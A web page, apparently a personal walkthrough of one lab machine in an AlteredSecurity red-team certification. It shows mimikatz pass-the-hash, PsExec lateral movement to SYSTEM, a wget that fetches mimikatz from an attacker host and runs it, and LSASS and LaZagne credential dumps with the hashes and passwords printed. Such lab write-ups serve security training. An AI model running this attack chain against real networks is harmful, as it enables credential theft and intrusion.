@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CRTM Walkthrough Global Central Bank | This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
+<meta property="og:description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
+<link rel="canonical" href="http://localhost:4000/sec-syslog01.html" />
+<meta property="og:url" content="http://localhost:4000/sec-syslog01.html" />
+<meta property="og:site_name" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CRTM Walkthrough Global Central Bank" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/sec-syslog01.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CRTM Walkthrough Global Central Bank</h1>
+        </a>
+        <h2>This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</h2>
+
+        <section id="downloads">
+          
+            <a href="" class="btn">Download as .zip</a>
+            <a href="" class="btn">Download as .tar.gz</a>
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="sec-syslog01gcbseclocal-192168144197">sec-syslog01.gcbsec.local 192.168.144.197</h2>
+
+<p>It’s required enumerate the network range in order to found the sec-syslog01.gcbsec.local machine, because couldn’t be resolved using DNS and It hasn’t a trusted relationship with known domains.</p>
+
+<p>Network range:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.144.0/24
+</code></pre></div></div>
+<p>IP detected:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.144.197
+</code></pre></div></div>
+
+<h3 id="1-impersonate-the-local-admin-user-of-sec-syslog01-machine-from-attacker-machine">1. Impersonate the local admin user of sec-syslog01 machine from attacker machine</h3>
+
+<p>Open a new terminal with administrative privileges on it-employee15 machine and impersonate admin user:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; C:\tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /user:admin /domain:SECSYSLOG /ntlm:fd9987e39827094aebac8233fefa519b /run:powershell
+user    : admin
+domain  : SECSYSLOG
+program : powershell
+impers. : no
+NTLM    : fd9987e39827094aebac8233fefa519b
+  |  PID  5688
+  |  TID  2960
+  |  LSA Process is now R/W
+  |  LUID 0 ; 1546939386 (00000000:5c346bfa)
+  \_ msv1_0   - data copy @ 0000021C7C5EF5F0 : OK !
+  \_ kerberos - data copy @ 0000021C7CFACC48
+   \_ aes256_hmac       -&gt; null
+   \_ aes128_hmac       -&gt; null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000021C7CD4B478 (32) -&gt; null
+
+mimikatz #
+
+</code></pre></div></div>
+
+<h3 id="2-use-psexec-for-lateral-movement-to-target-sec-syslog01-ip-machine-with-administrative-privileges">2. Use PSExec for lateral movement to target sec-syslog01 ip machine with administrative privileges</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami
+it\itemployee15
+PS C:\Windows\system32&gt; hostname
+IT-Employee15
+PS C:\Windows\system32&gt; C:\tools\PsExec.exe \\192.168.144.197 -i -s powershell
+
+PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami; hostname; ipconfig
+nt authority\system
+sec-syslog01
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::9989:7e6a:4432:7629%6
+   IPv4 Address. . . . . . . . . . . : 192.168.144.197
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.144.254
+PS C:\Windows\system32&gt;
+PS C:\Windows\system32&gt;
+</code></pre></div></div>
+
+<h3 id="3-disable-av-and-dump-lsass-process">3. Disable AV and dump Lsass process</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; wget http://192.168.100.15/mimikatz_2_1_1.exe -OutFile C:\mimikatz.exe
+gtht:/9.68.0015miat2__1xe-OtFleC:miat.eePS C:\Windows\system32&gt;
+PS C:\Windows\system32&gt; C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
+:mmkt.x piiee:eu""oe:lvae""skuls::goPswrd""al:it vut:rd/ac""xt
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+584     {0;000003e7} 1 D 17517          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -&gt; Impersonated !
+ * Process Token : {0;000003e7} 0 D 6165765     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 6211578     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 831049 (00000000:000cae49)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : SEC-SYSLOG01
+Logon Server      : SEC-SYSLOG01
+Logon Time        : 4/29/2024 12:15:50 AM
+SID               : S-1-5-21-2886985321-2087241558-4159712032-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : SEC-SYSLOG01
+         * NTLM     : 5b184274dcba7bfd289e8a4f439676a4
+         * SHA1     : 42a44d0a532bf5d4f957bd2ec1786dabbf11c45a
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : SEC-SYSLOG01
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : SEC-SYSLOG01
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 798636 (00000000:000c2fac)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/29/2024 12:15:07 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+         * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%&gt;uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&amp;^B#D+&gt;su`'p[A$K\U&lt;?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 76173 (00000000:0001298d)
+Session           : Service from 0
+User Name         : syslogagent
+Domain            : SEC
+Logon Server      : SEC-DC
+Logon Time        : 4/28/2024 11:50:51 PM
+SID               : S-1-5-21-4056425676-3036975250-1243519898-1105
+        msv :
+         [00000003] Primary
+         * Username : syslogagent
+         * Domain   : SEC
+         * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71
+         * SHA1     : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+         * DPAPI    : d60699429f9f948597f90693f346eaf2
+        tspkg :
+        wdigest :
+         * Username : syslogagent
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : syslogagent
+         * Domain   : GCBSEC.LOCAL
+         * Password : Password123
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:48 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+         * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23350 (00000000:00005b36)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:48 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+         * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%&gt;uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&amp;^B#D+&gt;su`'p[A$K\U&lt;?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23283 (00000000:00005af3)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:48 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+         * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : SEC-SYSLOG01$
+         * Domain   : gcbsec.local
+         * Password : %Z3@gGD=%@.fu?xSI71?'13U`9LOSgwrsVLR3\f"ZDa1rO'pm)\8"%&gt;uA!.qbr3;BLT5t%K*.PbVfI.S"Tdj2Y&amp;^B#D+&gt;su`'p[A$K\U&lt;?:sDu)wyZ0KrqUI
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:48 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 22162 (00000000:00005692)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:47 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * NTLM     : 24413f97e44cd86bfe2e7693d85be7e6
+         * SHA1     : 6eb5f022a4f637ee790945d58410a22203e9a7e1
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SEC-SYSLOG01$
+Domain            : SEC
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:50:47 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SEC-SYSLOG01$
+         * Domain   : SEC
+         * Password : (null)
+        kerberos :
+         * Username : sec-syslog01$
+         * Domain   : GCBSEC.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+        Name       : Web Credentials
+        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Items (0)
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+        Name       : Windows Credentials
+        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
+        Items (0)
+
+mimikatz(commandline) # vault::cred /patch
+
+mimikatz(commandline) # exit
+Bye!
+</code></pre></div></div>
+
+<p>Using LaZagne too for hash dump:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; PS C:\&gt; C:\LaZagne.exe all
+:LZgeeeal
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+[+] System masterkey decrypted for 0f7f3573-6811-4125-82e8-72ff9ec106ee
+[+] System masterkey decrypted for 5b30edf3-bde5-4e44-84d0-97fd34040d96
+[+] System masterkey decrypted for 68a50b7c-d222-4209-9362-874b5c9849ee
+[+] System masterkey decrypted for 697710c0-172f-4556-bdb4-46f052b6b3bd
+
+########## User: SYSTEM ##########
+
+------------------- Hashdump passwords -----------------
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5b184274dcba7bfd289e8a4f439676a4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+secadminlocal:1003:aad3b435b51404eeaad3b435b51404ee:cabc194605c92c9f05e3da59724ee615:::
+admin:1006:aad3b435b51404eeaad3b435b51404ee:fd9987e39827094aebac8233fefa519b:::
+
+------------------- Pypykatz passwords -----------------
+
+[+] Shahash found !!!
+Shahash: 42a44d0a532bf5d4f957bd2ec1786dabbf11c45a
+Nthash: 5b184274dcba7bfd289e8a4f439676a4
+Login: Administrator
+
+[+] Shahash found !!!
+Shahash: 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
+Nthash: 58a478135a93ac3bf058a5ea0e8fdb71
+Login: syslogagent
+
+[+] Shahash found !!!
+Shahash: 6eb5f022a4f637ee790945d58410a22203e9a7e1
+Nthash: 24413f97e44cd86bfe2e7693d85be7e6
+Login: SEC-SYSLOG01$
+
+------------------- Lsa_secrets passwords -----------------
+
+$MACHINE.ACC
+0000   F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   25 00 5A 00 33 00 40 00 67 00 47 00 44 00 3D 00    %.Z.3.@.g.G.D.=.
+0020   25 00 40 00 2E 00 66 00 75 00 3F 00 78 00 53 00    %.@...f.u.?.x.S.
+0030   49 00 37 00 31 00 3F 00 27 00 31 00 33 00 55 00    I.7.1.?.'.1.3.U.
+0040   60 00 39 00 4C 00 4F 00 53 00 67 00 77 00 72 00    `.9.L.O.S.g.w.r.
+0050   73 00 56 00 4C 00 52 00 33 00 5C 00 66 00 22 00    s.V.L.R.3...f.".
+0060   5A 00 44 00 61 00 31 00 72 00 4F 00 27 00 70 00    Z.D.a.1.r.O.'.p.
+0070   6D 00 29 00 5C 00 38 00 22 00 25 00 3E 00 75 00    m.)...8.".%.&gt;.u.
+0080   41 00 21 00 2E 00 71 00 62 00 72 00 33 00 3B 00    A.!...q.b.r.3.;.
+0090   42 00 4C 00 54 00 35 00 74 00 25 00 4B 00 2A 00    B.L.T.5.t.%.K.*.
+00A0   2E 00 50 00 62 00 56 00 66 00 49 00 2E 00 53 00    ..P.b.V.f.I...S.
+00B0   22 00 54 00 64 00 6A 00 32 00 59 00 26 00 5E 00    ".T.d.j.2.Y.&amp;.^.
+00C0   42 00 23 00 44 00 2B 00 3E 00 73 00 75 00 60 00    B.#.D.+.&gt;.s.u.`.
+00D0   27 00 70 00 5B 00 41 00 24 00 4B 00 5C 00 55 00    '.p.[.A.$.K...U.
+00E0   3C 00 3F 00 3A 00 73 00 44 00 75 00 29 00 77 00    &lt;.?.:.s.D.u.).w.
+00F0   79 00 5A 00 30 00 4B 00 72 00 71 00 55 00 49 00    y.Z.0.K.r.q.U.I.
+0100   8F 5C 4B 48 70 E6 D5 57 68 5E FD 33 47 D6 64 5F    ..KHp..Wh^.3G.d_
+
+DPAPI_SYSTEM
+0000   01 00 00 00 B8 D7 EF B9 B7 06 2A B1 43 96 35 0F    ..........*.C.5.
+0010   78 D2 53 31 64 F5 7D 76 67 59 D7 3B 1C 01 81 C3    x.S1d.}vgY.;....
+0020   61 67 13 61 52 7B 63 10 78 0C 4F 16                ag.aR{c.x.O.
+
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   40 06 A0 40 C4 AD 7A 21 F8 F7 88 AB 67 2E 81 B9    @..@..z!....g...
+0020   65 10 2A 91 B1 C2 00 61 5B ED C8 04 92 A4 63 DF    e.*....a[.....c.
+0030   3C 15 D1 72 A7 C5 CA CB 44 CD 8F F5 89 F0 13 91    &lt;..r....D.......
+0040   56 19 3A 76 4B FD 32 C8 1A ED 9C AB 15 85 26 39    V.:vK.2.......&amp;9
+0050   1D FF 16 0D 69 1D 66 B4 AE 55 43 9C 15 04 42 50    ....i.f..UC...BP
+
+_SC_SNMPTRAP
+0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
+0010   50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00    P.a.s.s.w.o.r.d.
+0020   31 00 32 00 33 00 00 00 00 00 00 00 00 00 00 00    1.2.3...........
+
+
+[+] 42a44d0a532bf5d4f957bd2ec1786dabbf11c45a ok for masterkey e8685d11-2d99-4a42-a862-ca7e3e411e69
+
+[+] 3 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 9.236833095550537
+</code></pre></div></div>
+
+<p><a href="./section5.html">back</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
